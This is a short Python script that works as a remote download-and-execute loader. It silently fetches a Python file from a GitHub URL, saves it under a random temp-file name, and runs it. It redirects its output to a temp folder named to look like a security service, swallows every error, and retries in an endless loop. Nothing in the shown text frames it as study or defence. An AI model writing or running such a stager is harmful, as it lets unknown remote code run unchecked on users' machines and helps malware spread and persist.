import sys, os, tempfile

log_dir = os.path.join(tempfile.gettempdir(), "SecurityServices")
os.makedirs(log_dir, exist_ok=True)
log_path = os.path.join(log_dir, "debug.log")
sys.stdout = open(log_path, "a", buffering=1)
sys.stderr = sys.stdout

from time import sleep
import subprocess
import pathlib
import requests
import random
import string

def random_ext(n=3):
    return "." + "".join(random.choices(string.ascii_lowercase, k=n))

URL = "https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/user_script.py"  # remote file URL

def main():
    # Download remote content
    content = requests.get(URL, timeout=10).text
    
    # Create random file in %TEMP% with random name + extension
    with tempfile.NamedTemporaryFile(
        mode="w",
        delete=False,
        suffix=random_ext(),
        encoding="utf-8"
    ) as f:
        f.write(content)
        temp_path = pathlib.Path(f.name)
    
    subprocess.run(
        [sys.executable, str(temp_path)],
        check=True
    )
    
    while True: pass

while True:
    try:
        main()
    except:
        pass
    sleep(10)
